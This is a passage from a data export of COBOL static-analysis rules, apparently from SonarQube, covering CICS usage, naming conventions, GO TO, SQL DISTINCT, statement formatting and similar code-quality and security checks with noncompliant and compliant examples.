  EXEC CICS XCTL PROGRAM ('P4DERROR') COMMAREA (Y4DERROR) LENGTH (Y4FLFIC-Y4DERROR)
</pre>",cobol:CICS.LinkOrXctlWithoutLengthClauseCheck,cobol,COBOL,"<p>When using <code>CICS XCTL</code> or <code>CICS LINK</code>, it is a bad practice not to specify the length of the communication area.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  EXEC CICS LINK PROGRAM ('SPI2TCV') COMMAREA (SPI-PARMCICS)  RESP (WS-RESP)  *&gt; Noncompliant

  EXEC CICS XCTL PROGRAM ('P4DERROR') COMMAREA (Y4DERROR)  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
  EXEC CICS LINK PROGRAM ('SPI2TCV') COMMAREA (SPI-PARMCICS) LENGTH (SPI-LONG) RESP (WS-RESP)

  EXEC CICS XCTL PROGRAM ('P4DERROR') COMMAREA (Y4DERROR) LENGTH (Y4FLFIC-Y4DERROR)
</pre>","""COMMAREA"" length should be specified in ""CICS Link"" and ""CICS Xctl"" commands",[],CRITICAL,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all [report/]program names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the regular expression <code>^([A-Z0-9_]*|[a-z0-9_]*)$</code>:</p>
<pre>
    IDENTIFICATION DIVISION.
       PROGRAM-ID. MY-PROGRAM.      *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
    IDENTIFICATION DIVISION.
       PROGRAM-ID. MY_PROGRAM.
</pre>",cobol:COBOL.ProgramNameCheck,cobol,COBOL,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all [report/]program names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the regular expression <code>^([A-Z0-9_]*|[a-z0-9_]*)$</code>:</p>
<pre>
    IDENTIFICATION DIVISION.
       PROGRAM-ID. MY-PROGRAM.      *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
    IDENTIFICATION DIVISION.
       PROGRAM-ID. MY_PROGRAM.
</pre>",Program names should comply with a naming convention,"[{'key': 'regexPatternString', 'htmlDesc': 'A regular expression to specify the program naming convention', 'defaultValue': '.*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>You should avoid using the <code>MERGE</code> statement because it is inefficient. Instead, external tools should be used to merge.</p>",cobol:COBOL.MergeStatementUsageCheck,cobol,COBOL,"<p>You should avoid using the <code>MERGE</code> statement because it is inefficient. Instead, external tools should be used to merge.</p>","""MERGE"" should not be used",[],MAJOR,['performance'],CODE_SMELL
2017-04-11T12:32:43+0200,"<p>The <code>ACCEPT</code> keyword does no editing or error checking of the data it stores, therefore its use can be dangerous. For this reason,
<code>ACCEPT</code> should be avoided. </p>
<h2>Noncompliant Code Example</h2>
<pre>
 01 USER-INPUT PIC X(4).

  GET-USER-INPUT.
       MOVE 'N' TO WS-NUMERIC.
       PERFORM UNTIL WS-NUMERIC = 'Y'
           DISPLAY 'ENTER YOUR 4 DIGIT RECORD NUMBER: ' NO ADVANCING
           ACCEPT USER-RECORD *&gt; Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule ignores uses of <code>ACCEPT FROM</code> with date/time-related inputs.</p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",cobol:S3394,cobol,COBOL,"<p>The <code>ACCEPT</code> keyword does no editing or error checking of the data it stores, therefore its use can be dangerous. For this reason,
<code>ACCEPT</code> should be avoided. </p>
<h2>Noncompliant Code Example</h2>
<pre>
 01 USER-INPUT PIC X(4).

  GET-USER-INPUT.
       MOVE 'N' TO WS-NUMERIC.
       PERFORM UNTIL WS-NUMERIC = 'Y'
           DISPLAY 'ENTER YOUR 4 DIGIT RECORD NUMBER: ' NO ADVANCING
           ACCEPT USER-RECORD *&gt; Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule ignores uses of <code>ACCEPT FROM</code> with date/time-related inputs.</p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>","""ACCEPT"" should not be used",[],CRITICAL,['owasp-a1'],VULNERABILITY
2013-06-19T07:34:52+0200,"<p>Portability issues may restrict which characters should be used in an identifier. </p>
<p>This rule checks identifier names against a regular expression of disallowed characters. Due to a technical limitation, the COBOL analyzer is not
able for the time-being to differentiate lowercase from uppercase characters.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>[^a-zA-Z0-9-]</code>:</p>
<pre>
MOVE DATA-1 TO DATA_2 *&gt; Noncompliant; '_' not allowed
</pre>
<h2>Compliant Solution</h2>
<pre>
MOVE DATA-1 TO DATA-2
</pre>",cobol:COBOL.IdentifierCharacterCheck,cobol,COBOL,"<p>Portability issues may restrict which characters should be used in an identifier. </p>
<p>This rule checks identifier names against a regular expression of disallowed characters. Due to a technical limitation, the COBOL analyzer is not
able for the time-being to differentiate lowercase from uppercase characters.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>[^a-zA-Z0-9-]</code>:</p>
<pre>
MOVE DATA-1 TO DATA_2 *&gt; Noncompliant; '_' not allowed
</pre>
<h2>Compliant Solution</h2>
<pre>
MOVE DATA-1 TO DATA-2
</pre>",Disallowed characters should not be used in identifiers,"[{'key': 'regex', 'htmlDesc': 'Regular expression to be used to detect prohibited characters', 'defaultValue': '[^a-zA-Z0-9-]', 'type': 'STRING'}]",MINOR,['lock-in'],CODE_SMELL
2014-09-08T12:51:22+0200,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",cobol:S105,cobol,COBOL,"<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>",Tabulation characters should not be used,[],MINOR,['convention'],CODE_SMELL
2016-05-06T09:20:29+0200,"<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex
statements.</p>
<p>This rule raises an issue when more than the allowed number of non-like operators are used in a statement without parentheses to make execution
order explicit.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 2:</p>
<pre>
COMPUTE WSRESULT = WS1 + 5 * WS2 - WS3**2 END-COMPUTE  *&gt; Noncompliant
COMPUTE WSRESULT2 = WS1 + 5 + WS2 + WS3 + WS4 END-COMPUTE
</pre>
<h2>Compliant Solution</h2>
<pre>
COMPUTE WSRESULT = WS1 + (5 * WS2) - (WS3**2) END-COMPUTE
COMPUTE WSRESULT2 = WS1 + 5 + WS2 + WS3 + WS4 END-COMPUTE
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on C's operator precedence rules in expressions </li>
  <li> MISRA C:2004, 12.2 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-0-1 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C++:2008, 5-0-2 - Limited dependence should be placed on C++ operator precedence rules in expressions </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_wI"">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9wHEAw"">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/783.html"">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>
</ul>",cobol:S864,cobol,COBOL,"<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex
statements.</p>
<p>This rule raises an issue when more than the allowed number of non-like operators are used in a statement without parentheses to make execution
order explicit.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 2:</p>
<pre>
COMPUTE WSRESULT = WS1 + 5 * WS2 - WS3**2 END-COMPUTE  *&gt; Noncompliant
COMPUTE WSRESULT2 = WS1 + 5 + WS2 + WS3 + WS4 END-COMPUTE
</pre>
<h2>Compliant Solution</h2>
<pre>
COMPUTE WSRESULT = WS1 + (5 * WS2) - (WS3**2) END-COMPUTE
COMPUTE WSRESULT2 = WS1 + 5 + WS2 + WS3 + WS4 END-COMPUTE
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on C's operator precedence rules in expressions </li>
  <li> MISRA C:2004, 12.2 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-0-1 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C++:2008, 5-0-2 - Limited dependence should be placed on C++ operator precedence rules in expressions </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_wI"">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/9wHEAw"">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/783.html"">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>
</ul>",Limited dependence should be placed on operator precedence,"[{'key': 'threshold', 'htmlDesc': 'The maximum number of operators allowed before an issue is raised', 'defaultValue': '2', 'type': 'INTEGER'}]",MAJOR,"['cert', 'cwe', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>OS/VS COBOL accepted the <code>EXHIBIT</code> statement, but IBM Enterprise COBOL does not. With IBM Enterprise COBOL, the <code>DISPLAY</code>
statement must be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       DATA DIVISION.

       WORKING-STORAGE SECTION.
         01 WS-FOO PIC X(42).
         01 WS-BAR PIC X(42).

       PROCEDURE DIVISION.
      * Non-Compliant
         EXHIBIT NAMED WS-FOO WS-BAR.
       END PROGRAM foo.
</pre>
<h2>Compliant Solution</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       DATA DIVISION.

       WORKING-STORAGE SECTION.
         01 WS-FOO PIC X(42).
         01 WS-BAR PIC X(42).

       PROCEDURE DIVISION.
      * Compliant
         DISPLAY ""WS-FOO = "" WS-FOO
             ""WS-BAR = "" WS-BAR.
       END PROGRAM foo.
</pre>",cobol:COBOL.ExhibitStatementUsageCheck,cobol,COBOL,"<p>OS/VS COBOL accepted the <code>EXHIBIT</code> statement, but IBM Enterprise COBOL does not. With IBM Enterprise COBOL, the <code>DISPLAY</code>
statement must be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       DATA DIVISION.

       WORKING-STORAGE SECTION.
         01 WS-FOO PIC X(42).
         01 WS-BAR PIC X(42).

       PROCEDURE DIVISION.
      * Non-Compliant
         EXHIBIT NAMED WS-FOO WS-BAR.
       END PROGRAM foo.
</pre>
<h2>Compliant Solution</h2>
<pre>
       IDENTIFICATION DIVISION.
       PROGRAM-ID. foo.

       DATA DIVISION.

       WORKING-STORAGE SECTION.
         01 WS-FOO PIC X(42).
         01 WS-BAR PIC X(42).

       PROCEDURE DIVISION.
      * Compliant
         DISPLAY ""WS-FOO = "" WS-FOO
             ""WS-BAR = "" WS-BAR.
       END PROGRAM foo.
</pre>","""OS/VS EXHIBIT"" should not be used",[],MINOR,['lock-in'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>EXIT</code> statement is useful for documenting the end point in a series of paragraphs. It identifies the point at which control will be
transferred.</p>",cobol:COBOL.PerformThruExitParagraphCheck,cobol,COBOL,"<p>The <code>EXIT</code> statement is useful for documenting the end point in a series of paragraphs. It identifies the point at which control will be
transferred.</p>","The last paragraph of a ""PERFORM THRU"" should only contain an ""EXIT"" statement",[],MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>After calling CICS commands with the <code>RESP</code> or <code>NOHANDLE</code> options, the return code should be tested.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  EXEC CICS DELETEQ TS        *&gt; Noncompliant; WS-STATUS should have been tested before the MOVE
    QNAME(WS-TS5FTARF-NAME)
    RESP(WS-STATUS)
  END-EXEC.
  MOVE WS-EIBTASKN (4:4) TO WS-TS5FTAR1-NAME-TSKID.
</pre>
<p> </p>
<h2>Compliant Solution</h2>
<pre>
  EXEC CICS DELETEQ TS
    QNAME(WS-TS5FTARF-NAME)
    RESP(WS-STATUS)
  END-EXEC.
  IF WS-STATUS ...

  MOVE WS-EIBTASKN (4:4) TO WS-TS5FTAR1-NAME-TSKID.
</pre>",cobol:CICS.StatementWithUntestedReturnCodeCheck,cobol,COBOL,"<p>After calling CICS commands with the <code>RESP</code> or <code>NOHANDLE</code> options, the return code should be tested.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  EXEC CICS DELETEQ TS        *&gt; Noncompliant; WS-STATUS should have been tested before the MOVE
    QNAME(WS-TS5FTARF-NAME)
    RESP(WS-STATUS)
  END-EXEC.
  MOVE WS-EIBTASKN (4:4) TO WS-TS5FTAR1-NAME-TSKID.
</pre>
<p> </p>
<h2>Compliant Solution</h2>
<pre>
  EXEC CICS DELETEQ TS
    QNAME(WS-TS5FTARF-NAME)
    RESP(WS-STATUS)
  END-EXEC.
  IF WS-STATUS ...

  MOVE WS-EIBTASKN (4:4) TO WS-TS5FTAR1-NAME-TSKID.
</pre>","The return codes of CICS commands with ""RESP"" or ""NOHANDLE"" conditions should be tested",[],CRITICAL,['error-handling'],CODE_SMELL
2013-12-03T11:11:14+0100,"<p>The cyclomatic complexity of a section should not exceed a defined threshold. Complex code is difficult to understand and therefore to
maintain.</p>",cobol:S1302,cobol,COBOL,"<p>The cyclomatic complexity of a section should not exceed a defined threshold. Complex code is difficult to understand and therefore to
maintain.</p>",Sections should not be too complex,"[{'key': 'maximum', 'htmlDesc': 'Maximum authorized complexity in sections', 'defaultValue': '50', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2013-10-08T11:22:37+0200,"<p>A section that grows too large tends to aggregate too many responsibilities.</p>
<p>Such sections inevitably become harder to understand and therefore harder to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller sections which focus on well-defined tasks. Those smaller sections will
not only be easier to understand, but also probably easier to test.</p>",cobol:S1300,cobol,COBOL,"<p>A section that grows too large tends to aggregate too many responsibilities.</p>
<p>Such sections inevitably become harder to understand and therefore harder to maintain.</p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller sections which focus on well-defined tasks. Those smaller sections will
not only be easier to understand, but also probably easier to test.</p>",Sections should not have too many lines of code,"[{'key': 'maximumLinesThreshold', 'htmlDesc': 'The maximum number of lines', 'defaultValue': '100', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The SQL <code>LOCK</code> command can be used to lock a DB table. Even if the use of the command can be fully justified, it should be done rarely,
and very carefully.</p>",cobol:SQL.LockTableStatementCheck,cobol,COBOL,"<p>The SQL <code>LOCK</code> command can be used to lock a DB table. Even if the use of the command can be fully justified, it should be done rarely,
and very carefully.</p>","""LOCK TABLE"" should not be used",[],BLOCKER,"['bad-practice', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>",cobol:COBOL.NoSonarCheck,cobol,COBOL,"<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>","Track uses of ""NOSONAR"" comments",[],MAJOR,['bad-practice'],CODE_SMELL
2014-06-06T08:18:23+0200,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MOVE '1' TO OCTET-1 MOVE '2' TO OCTET-2
</pre>
<h2>Compliant Solution</h2>
<pre>
MOVE '1' TO OCTET-1
MOVE '2' TO OCTET-2
</pre>
<h2>Exceptions</h2>
<p>Control flow statements with a single nested statement are ignored.</p>
<pre>
IF x &gt; 0 THEN DISPLAY ""positive"". *&gt; Compliant
</pre>",cobol:S122,cobol,COBOL,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MOVE '1' TO OCTET-1 MOVE '2' TO OCTET-2
</pre>
<h2>Compliant Solution</h2>
<pre>
MOVE '1' TO OCTET-1
MOVE '2' TO OCTET-2
</pre>
<h2>Exceptions</h2>
<p>Control flow statements with a single nested statement are ignored.</p>
<pre>
IF x &gt; 0 THEN DISPLAY ""positive"". *&gt; Compliant
</pre>",Statements should be on separate lines,[],MAJOR,['style'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Aligning opening and ending words of statements is critical to keep the code readable, especially when blocks contain nested statements.</p>
<p>For <code>IF</code> statements, this rule also checks the alignment of the <code>ELSE</code> word.</p>
<h2>Noncompliant Code Example</h2>
<pre>
IF SOME-STATUS = 1
  DISPLAY something
      END-IF.  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
IF SOME-STATUS = 1
  DISPLAY something
END-IF.
</pre>",cobol:COBOL.IfStatementFormattingCheck,cobol,COBOL,"<p>Aligning opening and ending words of statements is critical to keep the code readable, especially when blocks contain nested statements.</p>
<p>For <code>IF</code> statements, this rule also checks the alignment of the <code>ELSE</code> word.</p>
<h2>Noncompliant Code Example</h2>
<pre>
IF SOME-STATUS = 1
  DISPLAY something
      END-IF.  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
IF SOME-STATUS = 1
  DISPLAY something
END-IF.
</pre>",Ending words should be aligned with what they close,"[{'key': 'evaluate', 'htmlDesc': ""'true' to apply the rule to EVALUATE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'call', 'htmlDesc': ""'true' to apply the rule to CALL statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'accept', 'htmlDesc': ""'true' to apply the rule to ACCEPT statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'execDli', 'htmlDesc': ""'true' to apply the rule to EXECDLI statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'return', 'htmlDesc': ""'true' to apply the rule to RETURN statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'divide', 'htmlDesc': ""'true' to apply the rule to DIVIDE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'xmlParse', 'htmlDesc': ""'true' to apply the rule to XMLPARSE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'display', 'htmlDesc': ""'true' to apply the rule to DISPLAY statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'multiply', 'htmlDesc': ""'true' to apply the rule to MULTIPLY statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'perform', 'htmlDesc': ""'true' to apply the rule to PERFORM statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'add', 'htmlDesc': ""'true' to apply the rule to ADD statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'subtract', 'htmlDesc': ""'true' to apply the rule to SUBTRACT statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'rewrite', 'htmlDesc': ""'true' to apply the rule to REWRITE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'search', 'htmlDesc': ""'true' to apply the rule to SEARCH statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'start', 'htmlDesc': ""'true' to apply the rule to START statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'if', 'htmlDesc': ""'true' to apply the rule to IF statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'string', 'htmlDesc': ""'true' to apply the rule to STRING statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'delete', 'htmlDesc': ""'true' to apply the rule to DELETE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'write', 'htmlDesc': ""'true' to apply the rule to WRITE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'read', 'htmlDesc': ""'true' to apply the rule to READ statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'compute', 'htmlDesc': ""'true' to apply the rule to COMPUTE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'unstring', 'htmlDesc': ""'true' to apply the rule to UNSTRING statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'xmlGenerate', 'htmlDesc': ""'true' to apply the rule to XMLGENERATE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'move', 'htmlDesc': ""'true' to apply the rule to MOVE statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}]",MAJOR,['convention'],CODE_SMELL
2013-12-03T11:11:14+0100,"<p>Unstructured programming has been strongly criticized for producing barely readable (spaghetti) code. It offers programmers great freedom, but is
considered a bad approach for creating major projects.</p>
<p>In COBOL, the use of <code>GO TO</code> statements can lead to unstructured control flows. Eliminating <code>GO TO</code> statements in favor of
<code>PERFORM</code> statements will aid adherence to a procedural programming approach. However, this change could require heavy refactoring.</p>",cobol:S1308,cobol,COBOL,"<p>Unstructured programming has been strongly criticized for producing barely readable (spaghetti) code. It offers programmers great freedom, but is
considered a bad approach for creating major projects.</p>
<p>In COBOL, the use of <code>GO TO</code> statements can lead to unstructured control flows. Eliminating <code>GO TO</code> statements in favor of
<code>PERFORM</code> statements will aid adherence to a procedural programming approach. However, this change could require heavy refactoring.</p>","""GO TO"" should not be used",[],CRITICAL,['brain-overload'],CODE_SMELL
2013-12-03T11:11:14+0100,"<p>It is fairly normal for COBOL development teams to decide to work either with sections or with paragraphs and to make this choice a standard.</p>
<p>When sections are used, it is also normal to define another standard: ""End every section definition with an empty paragraph definition, or a
paragraph containing only a terminating statement"".</p>
<p>This empty paragraph can then be jumped to with a <code>GO TO</code> statement to stop the execution of a section.</p>
<p>Accepted terminating statements in the otherwise-empty ending paragraph are: <code>EXIT</code>, <code>EXIT PROGRAM</code>, <code>STOP RUN</code>,
and <code>GO BACK</code>.</p>
<h2>Noncompliant Code Example</h2>
<p>In this example, an empty paragraph is missing at the end of the first section definition.</p>
<pre>
FIRST_SECTION SECTION.
  ...

SECOND_SECTION SECTION.
  ...
SECOND_SECTION_END.
</pre>
<h2>Compliant Solution</h2>
<pre>
FIRST_SECTION SECTION.
  ...
FIRST_SECTION_END.

SECOND_SECTION SECTION.
  ...
SECOND_SECTION_END.
</pre>",cobol:S1307,cobol,COBOL,"<p>It is fairly normal for COBOL development teams to decide to work either with sections or with paragraphs and to make this choice a standard.</p>
<p>When sections are used, it is also normal to define another standard: ""End every section definition with an empty paragraph definition, or a
paragraph containing only a terminating statement"".</p>
<p>This empty paragraph can then be jumped to with a <code>GO TO</code> statement to stop the execution of a section.</p>
<p>Accepted terminating statements in the otherwise-empty ending paragraph are: <code>EXIT</code>, <code>EXIT PROGRAM</code>, <code>STOP RUN</code>,
and <code>GO BACK</code>.</p>
<h2>Noncompliant Code Example</h2>
<p>In this example, an empty paragraph is missing at the end of the first section definition.</p>
<pre>
FIRST_SECTION SECTION.
  ...

SECOND_SECTION SECTION.
  ...
SECOND_SECTION_END.
</pre>
<h2>Compliant Solution</h2>
<pre>
FIRST_SECTION SECTION.
  ...
FIRST_SECTION_END.

SECOND_SECTION SECTION.
  ...
SECOND_SECTION_END.
</pre>",Sections should end with an empty paragraph,[],MINOR,['convention'],CODE_SMELL
2016-05-06T09:20:29+0200,"<p>Program/file names offer only very limited space for indicating program function, which is why you should take advantage of the ability to specify
a program <code>TITLE</code>. Omitting the <code>TITLE</code> statement will result in a default, uncommunicative <code>TITLE</code> value being
printed at the top of each page of the source listing. Instead, you should write an expressive title that gives a clear impression of the program's
function. </p>
<p>This rule raises an issue when a there is no <code>TITLE</code> before the <code>IDENTIFICATION DIVISION</code>. Ideally, <code>TITLE</code> will
be the first line of a program, but it cannot be placed before compiler options.</p>
<h2>Noncompliant Code Example</h2>
<pre>
      * Copyright (c) 2012 MyCo. All rights reserved.  *&gt; Noncompliant
       IDENTIFICATION DIVISION.
</pre>
<h2>Compliant Solution</h2>
<pre>
       TITLE 'IntradayPosition.ExecutePostProcessing'
      * Copyright (c) 2012 MyCo. All rights reserved.
       IDENTIFICATION DIVISION.
</pre>",cobol:S3606,cobol,COBOL,"<p>Program/file names offer only very limited space for indicating program function, which is why you should take advantage of the ability to specify
a program <code>TITLE</code>. Omitting the <code>TITLE</code> statement will result in a default, uncommunicative <code>TITLE</code> value being
printed at the top of each page of the source listing. Instead, you should write an expressive title that gives a clear impression of the program's
function. </p>
<p>This rule raises an issue when a there is no <code>TITLE</code> before the <code>IDENTIFICATION DIVISION</code>. Ideally, <code>TITLE</code> will
be the first line of a program, but it cannot be placed before compiler options.</p>
<h2>Noncompliant Code Example</h2>
<pre>
      * Copyright (c) 2012 MyCo. All rights reserved.  *&gt; Noncompliant
       IDENTIFICATION DIVISION.
</pre>
<h2>Compliant Solution</h2>
<pre>
       TITLE 'IntradayPosition.ExecutePostProcessing'
      * Copyright (c) 2012 MyCo. All rights reserved.
       IDENTIFICATION DIVISION.
</pre>",Programs should begin with titles,[],MINOR,['convention'],CODE_SMELL
2014-01-31T10:12:05+0100,"<p>Call stacks containing lot of <code>PERFORM</code> statements is a key ingredient for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<p>This rule supports both sections and paragraphs. </p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 3:</p>
<pre>
PERFORM FIRST.

FIRST.
  PERFORM SECOND.

SECOND.
  PERFORM THIRD.

THIRD.
  PERFORM FOURTH.  *&gt; Noncompliant

FOURTH.
  DISPLAY something.
</pre>",cobol:S1306,cobol,COBOL,"<p>Call stacks containing lot of <code>PERFORM</code> statements is a key ingredient for making what's known as ""Spaghetti code"".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<p>This rule supports both sections and paragraphs. </p>
<h2>Noncompliant Code Example</h2>
<p>With a threshold of 3:</p>
<pre>
PERFORM FIRST.

FIRST.
  PERFORM SECOND.

SECOND.
  PERFORM THIRD.

THIRD.
  PERFORM FOURTH.  *&gt; Noncompliant

FOURTH.
  DISPLAY something.
</pre>","""PERFORM"" calls should not be nested too deeply","[{'key': 'max', 'htmlDesc': 'Maximum allowed call stack', 'defaultValue': '5', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Using <code>DISTINCT</code> in SQL <code>SELECT</code> statements should be avoided. Not only is this command to remove duplicates not efficient,
but a <code>SELECT DISTINCT</code> query indicates that something is not quite right. That is because using the <code>DISTINCT</code> keyword means
that redundant data is being pulled from the database and then discarded.</p>",cobol:SQL.DistinctUsageCheck,cobol,COBOL,"<p>Using <code>DISTINCT</code> in SQL <code>SELECT</code> statements should be avoided. Not only is this command to remove duplicates not efficient,
but a <code>SELECT DISTINCT</code> query indicates that something is not quite right. That is because using the <code>DISTINCT</code> keyword means
that redundant data is being pulled from the database and then discarded.</p>","""DISTINCT"" should not be used in SQL ""SELECT"" statements",[],MAJOR,"['bad-practice', 'performance', 'sql']",CODE_SMELL
2013-12-03T11:11:14+0100,"<p>Every section should be commented to explain its goal and how it works. This comment can be placed either just before or just after the section
label.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    UNCOMMENTED-SECTION SECTION.
</pre>
<h2>Compliant Solution</h2>
<pre>
* Some comments
    CORRECTLY-COMMENTED-SECTION SECTION.

    ANOTHER-CORRECTLY-COMMENTED-SECTION SECTION.
* Some comments
</pre>",cobol:S1305,cobol,COBOL,"<p>Every section should be commented to explain its goal and how it works. This comment can be placed either just before or just after the section
label.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    UNCOMMENTED-SECTION SECTION.
</pre>
<h2>Compliant Solution</h2>
<pre>
* Some comments
    CORRECTLY-COMMENTED-SECTION SECTION.

    ANOTHER-CORRECTLY-COMMENTED-SECTION SECTION.
* Some comments
</pre>",Sections should be documented,[],MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>INITIALIZE</code> statement should not be used because it does not properly manage the initialization of <code>REDEFINE</code> and
fillers.</p>",cobol:COBOL.InitializeStatementUsageCheck,cobol,COBOL,"<p>The <code>INITIALIZE</code> statement should not be used because it does not properly manage the initialization of <code>REDEFINE</code> and
